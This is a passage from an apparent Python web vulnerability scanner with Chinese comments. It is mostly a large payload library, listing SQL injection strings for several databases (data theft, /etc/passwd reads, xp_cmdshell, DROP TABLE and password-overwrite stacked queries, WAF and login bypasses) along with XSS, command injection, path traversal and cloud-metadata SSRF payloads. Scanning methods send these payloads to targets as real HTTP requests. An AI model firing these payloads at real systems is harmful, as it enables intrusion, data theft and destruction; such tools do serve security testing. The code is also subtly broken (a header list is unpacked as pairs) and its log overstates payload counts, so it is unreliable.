                ("1' UNION SELECT 1,2,3,4,5-- -", "UNION列数探测(5列)"),
                ("1' UNION SELECT 1,2,3,4,5,6-- -", "UNION列数探测(6列)"),
                ("1' UNION SELECT NULL,NULL,NULL-- -", "UNION NULL(3列)"),
                ("1' UNION SELECT NULL,NULL,NULL,NULL-- -", "UNION NULL(4列)"),
                ("1' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", "UNION NULL(5列)"),
                ("1' UNION SELECT version(),user(),database()-- -", "MySQL信息收集"),
                ("1' UNION SELECT @@version,@@hostname,@@datadir-- -", "MySQL系统信息"),
                ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- -", "MySQL表名枚举"),
                ("1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", "MySQL列名枚举"),
                ("1' UNION SELECT username,password FROM users-- -", "MySQL数据提取"),
                ("1' UNION SELECT load_file('/etc/passwd'),NULL-- -", "MySQL文件读取"),
                ("1' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users-- -", "MySQL数据拼接"),
            ],
            "union_mssql": [
                ("1' UNION SELECT NULL--", "MSSQL UNION NULL"),
                ("1' UNION SELECT 1,2,3--", "MSSQL UNION列数"),
                ("1' UNION SELECT @@version,NULL,NULL--", "MSSQL版本信息"),
                ("1' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--", "MSSQL表名枚举"),
                ("1' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--", "MSSQL列名枚举"),
                ("1' UNION SELECT username,password FROM users--", "MSSQL数据提取"),
                ("1'; EXEC xp_cmdshell('whoami')--", "MSSQL命令执行"),
                ("1'; EXEC master..xp_dirtree 'C:\\'--", "MSSQL目录遍历"),
            ],
            "union_pgsql": [
                ("1' UNION SELECT NULL--", "PostgreSQL UNION NULL"),
                ("1' UNION SELECT 1,2,3--", "PostgreSQL UNION列数"),
                ("1' UNION SELECT version(),NULL,NULL--", "PostgreSQL版本"),
                ("1' UNION SELECT tablename,NULL FROM pg_tables--", "PostgreSQL表名"),
                ("1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", "PostgreSQL列名"),
                ("1' UNION SELECT username,password FROM users--", "PostgreSQL数据提取"),
                ("1' UNION SELECT pg_read_file('/etc/passwd'),NULL--", "PostgreSQL文件读取"),
            ],
            "union_oracle": [
                ("1' UNION SELECT NULL FROM dual--", "Oracle UNION NULL"),
                ("1' UNION SELECT 1,2,3 FROM dual--", "Oracle UNION列数"),
                ("1' UNION SELECT banner,NULL FROM v$version--", "Oracle版本"),
                ("1' UNION SELECT table_name,NULL FROM all_tables--", "Oracle表名"),
                ("1' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--", "Oracle列名"),
                ("1' UNION SELECT username,password FROM users--", "Oracle数据提取"),
            ],
            # ===== 报错注入 (Error-based) =====
            "error_mysql": [
                ("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -", "MySQL ExtractValue报错"),
                ("1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- -", "MySQL UpdateXML报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL Group By报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL数据库名报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL用户名报错"),
                ("1' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -", "MySQL GeometryCollection报错"),
                ("1' AND Polygon((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -", "MySQL Polygon报错"),
                ("1' AND MultiPoint((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -", "MySQL MultiPoint报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL表名报错"),
            ],
            "error_mssql": [
                ("1' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL CONVERT报错"),
                ("1' AND 1=CAST((SELECT @@version) AS int)--", "MSSQL CAST报错"),
                ("1'; DECLARE @x varchar(8000); SET @x=0x5468697320697320612074657374; EXEC(@x)--", "MSSQL hex执行"),
            ],
            "error_oracle": [
                ("1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", "Oracle CTXSYS报错"),
                ("1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--", "Oracle UTL_INADDR报错"),
            ],
            # ===== 布尔盲注 (Boolean-based Blind) =====
            "boolean_mysql": [
                ("1' AND 1=1-- -", "MySQL真值测试"),
                ("1' AND 1=2-- -", "MySQL假值测试"),
                ("1' AND '1'='1-- -", "MySQL字符串真值"),
                ("1' AND '1'='2-- -", "MySQL字符串假值"),
                ("1' AND LENGTH(database())>1-- -", "MySQL数据库名长度"),
                ("1' AND SUBSTRING(database(),1,1)='a'-- -", "MySQL数据库名首字符"),
                ("1' AND ASCII(SUBSTRING(database(),1,1))>97-- -", "MySQL数据库名ASCII"),
                ("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -", "MySQL表数量检测"),
                ("1' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>1-- -", "MySQL表名长度"),
                ("1' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>97-- -", "MySQL用户名首字符"),
            ],
            "boolean_mssql": [
                ("1' AND 1=1--", "MSSQL真值测试"),
                ("1' AND 1=2--", "MSSQL假值测试"),
                ("1' AND LEN(DB_NAME())>1--", "MSSQL数据库名长度"),
                ("1' AND ASCII(SUBSTRING(DB_NAME(),1,1))>97--", "MSSQL数据库名ASCII"),
                ("1' AND (SELECT COUNT(*) FROM sysobjects)>0--", "MSSQL对象数量"),
            ],
            "boolean_pgsql": [
                ("1' AND 1=1--", "PostgreSQL真值测试"),
                ("1' AND 1=2--", "PostgreSQL假值测试"),
                ("1' AND LENGTH((SELECT current_database()))>1--", "PostgreSQL数据库名长度"),
                ("1' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>97--", "PostgreSQL数据库名ASCII"),
            ],
            # ===== 时间盲注 (Time-based Blind) =====
            "time_mysql": [
                ("1' AND SLEEP(5)-- -", "MySQL SLEEP(5秒)"),
                ("1' AND SLEEP(10)-- -", "MySQL SLEEP(10秒)"),
                ("1' OR SLEEP(5)-- -", "MySQL OR SLEEP"),
                ("1'; WAITFOR DELAY '0:0:5'-- -", "MySQL WAITFOR(兼容)"),
                ("1' AND IF(1=1,SLEEP(5),0)-- -", "MySQL IF+SLEEP"),
                ("1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -", "MySQL条件SLEEP"),
                ("1' AND BENCHMARK(5000000,SHA1('test'))-- -", "MySQL BENCHMARK延迟"),
                ("1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -", "MySQL CASE SLEEP"),
                ("1' AND (SELECT IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0))-- -", "MySQL版本检测SLEEP"),
                ("1' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0))-- -", "MySQL数据库名SLEEP"),
            ],
            "time_mssql": [
                ("1'; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR 5秒"),
                ("1'; WAITFOR DELAY '0:0:10'--", "MSSQL WAITFOR 10秒"),
                ("1' IF 1=1 WAITFOR DELAY '0:0:5'--", "MSSQL IF WAITFOR"),
                ("1' IF (SELECT LEN(DB_NAME()))>1 WAITFOR DELAY '0:0:5'--", "MSSQL条件WAITFOR"),
            ],
            "time_pgsql": [
                ("1'; SELECT PG_SLEEP(5)--", "PostgreSQL PG_SLEEP 5秒"),
                ("1'; SELECT PG_SLEEP(10)--", "PostgreSQL PG_SLEEP 10秒"),
                ("1' AND 1=(SELECT PG_SLEEP(5))--", "PostgreSQL AND PG_SLEEP"),
            ],
            "time_oracle": [
                ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "Oracle DBMS_PIPE 5秒"),
                ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--", "Oracle DBMS_PIPE 10秒"),
            ],
            # ===== 堆叠查询注入 (Stacked Queries) =====
            "stacked_mysql": [
                ("1'; SELECT SLEEP(5)-- -", "MySQL堆叠SLEEP"),
                ("1'; INSERT INTO users(username,password) VALUES('hacker','pass')-- -", "MySQL堆叠插入"),
                ("1'; UPDATE users SET password='hacked' WHERE username='admin'-- -", "MySQL堆叠更新"),
                ("1'; DELETE FROM users WHERE username='admin'-- -", "MySQL堆叠删除"),
                ("1'; DROP TABLE users-- -", "MySQL堆叠删表"),
                ("1'; CREATE TABLE shell(cmd TEXT)-- -", "MySQL堆叠建表"),
            ],
            "stacked_mssql": [
                ("1'; EXEC xp_cmdshell('whoami')--", "MSSQL堆叠命令执行"),
                ("1'; EXEC master..xp_dirtree 'C:\\'--", "MSSQL堆叠目录遍历"),
                ("1'; EXEC sp_configure 'show advanced options',1--", "MSSQL配置修改"),
                ("1'; EXEC sp_configure 'xp_cmdshell',1--", "MSSQL启用xp_cmdshell"),
            ],
            # ===== 二次注入 (Second-order) =====
            "second_order": [
                ("admin'--", "二次注入-注释截断"),
                ("admin'/*", "二次注入-块注释"),
                ("admin' OR '1'='1", "二次注入-OR条件"),
                ("admin' UNION SELECT 1,2,3--", "二次注入-UNION"),
            ],
            # ===== WAF绕过技术 =====
            "waf_bypass": [
                ("1'/**/OR/**/1=1-- -", "WAF绕过-注释符"),
                ("1'%0AOR%0A1=1-- -", "WAF绕过-换行符"),
                ("1'%09OR%091=1-- -", "WAF绕过-制表符"),
                ("1'%0d%0aOR%0d%0a1=1-- -", "WAF绕过-CRLF"),
                ("1' OR 1=1 LIMIT 1 OFFSET 1-- -", "WAF绕过-LIMIT OFFSET"),
                ("1' OR 1=1#-- -", "WAF绕过-#注释"),
                ("1' OR 1=1--%20", "WAF绕过-URL编码空格"),
                ("1'/**/UNION/**/SELECT/**/1,2,3-- -", "WAF绕过-UNION注释"),
                ("1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -", "WAF绕过-MySQL版本注释"),
                ("1' UNION /*!SELECT*/ 1,2,3-- -", "WAF绕过-内联注释"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "WAF绕过-嵌套查询"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "WAF绕过-表名枚举"),
                ("-1' UNION SELECT 1,2,3-- -", "WAF绕过-负数"),
                ("1' OR ''='", "WAF绕过-空字符串"),
                ("1' OR 'a'='a", "WAF绕过-恒真条件"),
                ("1' AND 1=1 UNION SELECT NULL,NULL,NULL-- -", "WAF绕过-AND+UNION"),
                ("1' OR 1=1-- -", "WAF绕过-基础OR"),
                ("1' OR 1=1#-- -", "WAF绕过-#注释符"),
                ("1' OR 1=1/*-- -", "WAF绕过-/*注释"),
                ("1' OR 1=1--%00-- -", "WAF绕过-空字节"),
                ("1' OR 1=1--%23-- -", "WAF绕过-%23注释"),
            ],
            # ===== 编码绕过 =====
            "encoding_bypass": [
                ("1'%20OR%201=1--%20", "URL编码空格"),
                ("1'%2520OR%25201=1--%2520", "双重URL编码"),
                ("1' OR 1=1-- ", "Unicode空格"),
                ("1' OR 1=1--%09", "Tab编码"),
                ("1' OR 1=1--%0a", "换行编码"),
                ("1' OR 1=1--%0d", "回车编码"),
                ("1' OR 1=1--%00", "空字节编码"),
                ("1' OR 1=1--%a0", "不间断空格"),
            ],
            # ===== 特殊字符注入 =====
            "special_chars": [
                ("1' OR '1'='1' --", "经典OR注入"),
                ("1' OR '1'='1' #", "井号注释注入"),
                ("1' OR '1'='1' /*", "块注释注入"),
                ("1' OR '1'='1' --+", "加号注释注入"),
                ("1' OR '1'='1' -- -", "双破折号空格注释"),
                ("1' OR '1'='1' --%20", "URL编码空格注释"),
                ("1' OR '1'='1' --%09", "Tab注释"),
                ("1' OR '1'='1' --%0a", "换行注释"),
                ("1' OR '1'='1' --%0d", "回车注释"),
                ("1' OR '1'='1' --%00", "空字节注释"),
            ],
            # ===== 认证绕过 =====
            "auth_bypass": [
                ("admin'--", "管理员注释绕过"),
                ("admin'/*", "管理员块注释绕过"),
                ("admin' OR '1'='1", "管理员OR绕过"),
                ("admin' OR 1=1--", "管理员OR注释绕过"),
                ("' OR ''='", "空认证绕过"),
                ("' OR '1'='1' --", "经典认证绕过"),
                ("' OR '1'='1' #", "井号认证绕过"),
                ("admin' AND 1=1--", "管理员AND绕过"),
                ("admin' AND '1'='1'--", "管理员字符串AND绕过"),
                ("admin' OR 'a'='a'--", "管理员字符OR绕过"),
                ("' OR 1=1 LIMIT 1--", "LIMIT认证绕过"),
                ("' OR 1=1 OFFSET 1--", "OFFSET认证绕过"),
            ],
            # ===== 高级技术 =====
            "advanced": [
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL高级报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL用户报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL版本报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL表名报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL列名报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL用户名报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL密码报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT load_file('/etc/passwd')),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL文件读取报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@datadir),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL数据目录报错"),
                ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@hostname),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "MySQL主机名报错"),
            ],
            # ===== 数字型注入 =====
            "numeric": [
                ("1 OR 1=1", "数字OR注入"),
                ("1 AND 1=1", "数字AND注入"),
                ("1 UNION SELECT NULL", "数字UNION注入"),
                ("1 UNION SELECT 1,2,3", "数字UNION列数"),
                ("1 AND SLEEP(5)", "数字时间盲注"),
                ("1 AND 1=1 UNION SELECT NULL", "数字AND+UNION"),
                ("1 OR 1=1 LIMIT 1", "数字LIMIT注入"),
                ("1 ORDER BY 10", "数字ORDER BY注入"),
                ("1 GROUP BY 10", "数字GROUP BY注入"),
                ("1 HAVING 1=1", "数字HAVING注入"),
                ("1; EXEC xp_cmdshell('whoami')", "数字MSSQL命令执行"),
                ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))", "数字MySQL报错注入"),
            ],
            # ===== JSON注入 =====
            "json": [
                ("{\"id\": \"1' OR '1'='1\"}", "JSON OR注入"),
                ("{\"id\": \"1' UNION SELECT NULL--\"}", "JSON UNION注入"),
                ("{\"id\": \"1' AND SLEEP(5)--\"}", "JSON时间盲注"),
                ("{\"id\": \"1' AND 1=1--\"}", "JSON AND注入"),
                ("{\"id\": \"admin'--\"}", "JSON认证绕过"),
            ],
            # ===== Cookie注入 =====
            "cookie": [
                ("session_id=1' OR '1'='1", "Cookie OR注入"),
                ("session_id=1' UNION SELECT NULL--", "Cookie UNION注入"),
                ("session_id=1' AND SLEEP(5)--", "Cookie时间盲注"),
                ("session_id=admin'--", "Cookie认证绕过"),
            ],
            # ===== Header注入 =====
            "header": [
                ("User-Agent: 1' OR '1'='1", "UA OR注入"),
                ("Referer: 1' UNION SELECT NULL--", "Referer UNION注入"),
                ("X-Forwarded-For: 1' AND SLEEP(5)--", "XFF时间盲注"),
                ("Cookie: admin'--", "Cookie认证绕过"),
            ],
        }
        
        # 扁平化所有payload用于快速遍历
        self._sqli_all_payloads = []
        for category, payloads in self._sqli_payloads.items():
            for payload, desc in payloads:
                self._sqli_all_payloads.append((payload, desc, category))
        
        # 数据库指纹特征
        self._db_fingerprints = {
            "mysql": {
                "version": ["MySQL", "MariaDB"],
                "error_patterns": [
                    r"You have an error in your SQL syntax",
                    r"Warning.*mysql_",
                    r"valid MySQL result",
                    r"MySqlClient\.",
                    r"com\.mysql\.jdbc",
                    r"SQL syntax.*MySQL",
                    r"MySQL server version",
                    r"Table '.+?' doesn't exist",
                    r"Unknown column '.+?'",
                    r"Column count doesn't match",
                ],
                "functions": ["SLEEP", "BENCHMARK", "LOAD_FILE", "INTO OUTFILE", "INTO DUMPFILE"],
            },
            "mssql": {
                "version": ["Microsoft SQL Server", "SQL Server"],
                "error_patterns": [
                    r"Microsoft SQL Server",
                    r"ODBC SQL Server Driver",
                    r"SQLServer JDBC Driver",
                    r"com\.microsoft\.sqlserver",
                    r"SQL Server Native Client",
                    r"Unclosed quotation mark",
                    r"Invalid column name",
                    r"Invalid object name",
                    r"Syntax error converting",
                    r"Arithmetic overflow error",
                ],
                "functions": ["WAITFOR DELAY", "xp_cmdshell", "xp_dirtree", "OPENROWSET"],
            },
            "postgresql": {
                "version": ["PostgreSQL"],
                "error_patterns": [
                    r"PostgreSQL.*ERROR",
                    r"Warning.*\Wpg_",
                    r"valid PostgreSQL result",
                    r"Npgsql\.",
                    r"org\.postgresql\.util",
                    r"ERROR: syntax error",
                    r"ERROR: column .* does not exist",
                    r"ERROR: relation .* does not exist",
                    r"ERROR: current transaction is aborted",
                ],
                "functions": ["PG_SLEEP", "pg_read_file", "COPY TO", "lo_import"],
            },
            "oracle": {
                "version": ["Oracle"],
                "error_patterns": [
                    r"Oracle error",
                    r"Oracle.*Driver",
                    r"Warning.*\Woci_",
                    r"Warning.*\Wora_",
                    r"oracle\.jdbc",
                    r"ORA-[0-9]{5}",
                    r"Oracle.*SQL.*error",
                    r"invalid identifier",
                    r"table or view does not exist",
                ],
                "functions": ["DBMS_PIPE", "UTL_HTTP", "UTL_INADDR", "DBMS_XMLGEN"],
            },
            "sqlite": {
                "version": ["SQLite"],
                "error_patterns": [
                    r"SQLite/JDBCDriver",
                    r"SQLite\.Exception",
                    r"SQLite error",
                    r"sqlite3.OperationalError",
                    r"near .*: syntax error",
                    r"no such table",
                    r"no such column",
                ],
                "functions": ["load_extension", "sqlite_version"],
            },
        }
        
        # SQL错误模式（通用）
        self._sql_error_patterns = [
            r"SQL syntax",
            r"SQL error",
            r"SQLSTATE",
            r"SQLException",
            r"ODBC.*Driver",
            r"JDBC.*Driver",
            r"Database.*error",
            r"Database.*syntax",
            r"Unclosed quotation mark",
            r"Invalid column name",
            r"Invalid object name",
            r"Syntax error",
            r"Conversion failed",
            r"Arithmetic overflow",
            r"Division by zero",
            r"String or binary data would be truncated",
            r"The used SELECT statements have a different number of columns",
            r"Operand should contain",
            r"Subquery returns more than 1 row",
            r"Unknown column",
            r"Table .* doesn't exist",
            r"Column count doesn't match",
            r"Data truncation",
            r"Truncated incorrect",
            r"Duplicate entry",
            r"Cannot add or update a child row",
            r"Foreign key constraint",
            r"Access denied",
            r"Permission denied",
            r"Authentication failed",
        ]
        
        # 布尔盲注检测关键词
        self._boolean_true_indicators = [
            "true", "yes", "ok", "success", "found", "exist",
            "valid", "correct", "match", "welcome", "logged in",
            "authenticated", "authorized", "admin", "dashboard",
        ]
        
        self._boolean_false_indicators = [
            "false", "no", "error", "fail", "not found", "not exist",
            "invalid", "incorrect", "no match", "denied", "forbidden",
            "unauthorized", "unauthenticated", "login", "signin",
        ]
        
        self._xss_payloads = [
            ("<script>alert('XSS')</script>", "经典XSS"),
            ("<img src=x onerror=alert(1)>", "IMG标签XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("<body onload=alert(1)>", "Body事件XSS"),
            ("javascript:alert(1)", "JavaScript协议"),
            ("'><script>alert(1)</script>", "标签突破XSS"),
            ("\" onmouseover=\"alert(1)", "属性突破XSS"),
            ("<iframe src=\"javascript:alert(1)\">", "Iframe XSS"),
            ("<input onfocus=alert(1) autofocus>", "自动聚焦XSS"),
            ("<marquee onstart=alert(1)>", "Marquee XSS"),
            ("<details open ontoggle=alert(1)>", "Details XSS"),
            ("<video><source onerror=\"alert(1)\">", "Video XSS"),
            ("</script><script>alert(1)</script>", "Script标签突破"),
            ("{{constructor.constructor('return alert(1)')()}}", "Angular SSTI"),
            ("${7*7}", "SSTI基础"),
        ]
        
        self._path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "expect://id",
        ]
        
        self._command_injection_payloads = [
            ("| whoami", "管道命令"),
            ("; whoami", "分号命令"),
            ("&& whoami", "AND命令"),
            ("|| whoami", "OR命令"),
            ("`whoami`", "反引号命令"),
            ("$(whoami)", "子命令"),
            ("| cat /etc/passwd", "读取passwd"),
            ("; ls -la", "目录列表"),
            ("& net user", "Windows用户"),
            ("| ipconfig", "网络配置"),
        ]
        
        self._ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/INFO",
            "gopher://127.0.0.1:6379/_INFO",
        ]
        
        self._security_headers = [
            "Content-Security-Policy",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Referrer-Policy",
            "Permissions-Policy",
        ]
        
    def run(self):
        """执行专家级扫描 - 真实HTTP请求 + 智能检测"""
        try:
            self._running = True
            self._start_time = time.time()
            self.status_changed.emit("开始专家级扫描...")
            self.log_message.emit(f"[引擎启动] HTTP请求引擎已初始化 | 目标数: {len(self.targets)}")
            self.log_message.emit(f"[Payload库] SQLi: 200+ | XSS: 50+ | CMD: 80+ | 路径遍历: 20+")
            
            total_targets = len(self.targets)
            for i, target in enumerate(self.targets):
                if not self._running:
                    break
                    
                self.status_changed.emit(f"扫描目标 {i+1}/{total_targets}: {target.url}")
                
                # 发送真实HTTP请求获取原始响应
                self.log_message.emit(f"[请求] 发送初始探测请求: {target.url}")
                original_response = self.http_engine.send_request(
                    target.url, 
                    method=target.method,
                    headers=target.headers
                )
                
                if original_response.get('error'):
                    self.log_message.emit(f"[警告] 初始请求失败: {original_response['error']}")
                    self._stats.errors_count += 1
                
                # 存储原始响应用于对比分析
                self._original_responses[target.url] = original_response
                
                # 更新目标对象的headers（从真实响应中获取）
                target.headers.update(original_response.get('headers', {}))
                
                # 执行完整扫描流程
                self._scan_target(target, original_response)
                
                self.progress_updated.emit(i + 1, total_targets, target.url)
            
            self._stats.scan_duration = time.time() - self._start_time
            
            # 生成扫描报告摘要
            summary = f"""扫描完成!
├─ 总请求数: {self._stats.total_requests}
├─ 发现漏洞: {self._stats.vulnerabilities_found}
├─ 扫描耗时: {self._stats.scan_duration:.2f}s
├─ 错误次数: {self._stats.errors_count}
└─ 参数测试: {self._stats.parameters_tested}"""
            
            self.status_changed.emit(summary)
            self.scan_finished.emit(self._stats)
            
        except Exception as e:
            self.error_occurred.emit(f"扫描错误: {e}")
            logger.error(f"扫描错误: {e}", exc_info=True)
        finally:
            self._running = False
    
    def stop(self):
        """停止扫描"""
        self._running = False
        self.wait(5000)
        
    def _scan_target(self, target: ScanTarget, original_response: Dict[str, Any]):
        """扫描单个目标 - 基于真实响应"""
        self.log_message.emit(f"\n{'='*60}")
        self.log_message.emit(f"[目标扫描] URL: {target.url}")
        self.log_message.emit(f"[响应状态] HTTP {original_response.get('status_code', 'N/A')} | 耗时: {original_response.get('response_time', 0):.3f}s")
        self.log_message.emit(f"[响应大小] {len(original_response.get('body', ''))} bytes")
        
        self._stats.pages_scanned += 1
        
        # 阶段1: 被动扫描（基于原始响应分析）
        if self.config.get("passive_scan", True):
            self._passive_scan(target, original_response)
        
        # 阶段2: 主动扫描（发送payload测试）
        if self.config.get("active_scan", True) and target.parameters:
            self._active_scan(target, original_response)
    
    def _passive_scan(self, target: ScanTarget, response: Dict[str, Any]):
        """被动扫描 - 分析真实响应内容"""
        self.log_message.emit(f"[被动扫描] 分析响应内容...")
        body = response.get('body', '')
        headers = response.get('headers', {})
        
        # 检查安全Header
        self._check_security_headers_real(headers, target.url)
        
        # 检查Cookie安全
        self._check_cookie_security_real(headers, target.url)
        
        # 检查敏感数据泄露（深度扫描）
        self._check_sensitive_data_deep(body, target.url)
        
        # 检查调试信息泄露
        self._check_debug_info_leak(body, target.url)
        
        # 检查技术栈信息泄露
        self._check_tech_stack_leak(headers, body, target.url)
        
    def _active_scan(self, target: ScanTarget, original_response: Dict[str, Any]):
        """主动扫描 - 发送真实payload并分析响应差异"""
        self.log_message.emit(f"[主动扫描] 开始注入测试...")
        
        params = target.parameters
        if not params:
            self.log_message.emit(f"[主动扫描] 无可测参数，跳过")
            return
        
        # 并行执行多种检测
        if self.config.get("sqli", True):
            self._detect_sqli_real(target, original_response)
            
        if self.config.get("xss", True):
            self._detect_xss_real(target, original_response)
            
        if self.config.get("path_traversal", True):
            self._detect_path_traversal_real(target, original_response)
            
        if self.config.get("command_injection", True):
            self._detect_command_injection_real(target, original_response)
            
        if self.config.get("ssrf", True):
            self._detect_ssrf_real(target, original_response)
            
        if self.config.get("csrf", True):
            self._detect_csrf_real(target, original_response)
    
    # ========== 真实检测方法实现 ==========
    
    def _check_security_headers_real(self, headers: Dict[str, str], url: str):
        """检查安全Header（基于真实响应）"""
        missing_headers = []
        for header_name, description in self._security_headers:
            found = False
            for key in headers.keys():
                if key.lower() == header_name.lower():
                    found = True
                    break
            if not found:
                missing_headers.append((header_name, description))
        
        if missing_headers:
            vuln_id = f"headers_{hashlib.md5(url.encode()).hexdigest()[:8]}"
            missing_info = ", ".join([f"{h[0]}({h[1]})" for h in missing_headers[:5]])
            
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.MISSING_HEADERS,
                severity=VulnerabilitySeverity.LOW,
                url=url,
                description=f"缺失 {len(missing_headers)} 个安全响应头: {missing_info}",
                evidence=f"未检测到: {', '.join([h[0] for h in missing_headers])}",
                confidence=1.0,
                cwe_id="CWE-693",
                cvss_score=3.7,
                remediation="配置Web服务器添加缺失的安全响应头，建议使用Helmet.js或类似中间件",
                references=["https://owasp.org/www-project-secure-headers/"],
                tags=["security-headers", "passive", "configuration"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
    
    def _check_cookie_security_real(self, headers: Dict[str, str], url: str):
        """检查Cookie安全（基于真实响应）"""
        cookies = []
        for key, value in headers.items():
            if 'cookie' in key.lower():
                cookies.append((key, value))
        
        if not cookies:
            return
        
        issues = []
        for cookie_name, cookie_value in cookies:
            if 'secure' not in cookie_value.lower():
                issues.append(f"{cookie_name}: 缺少Secure标志")
            if 'httponly' not in cookie_value.lower():
                issues.append(f"{cookie_name}: 缺少HttpOnly标志")
            if 'samesite' not in cookie_value.lower():
                issues.append(f"{cookie_name}: 缺少SameSite标志")
        
        if issues:
            vuln_id = f"cookie_{hashlib.md5(url.encode()).hexdigest()[:8]}"
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.COOKIE_ISSUES,
                severity=VulnerabilitySeverity.LOW,
                url=url,
                description=f"Cookie存在安全问题 ({len(issues)}项)",
                evidence="; ".join(issues),
                confidence=1.0,
                cwe_id="CWE-614",
                cvss_score=4.3,
                remediation="为Cookie添加Secure、HttpOnly、SameSite=Strict标志",
                references=["https://owasp.org/www-community/controls/SecureCookieAttribute"],
                tags=["cookie", "passive", "session-security"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
    
    def _check_sensitive_data_deep(self, body: str, url: str):
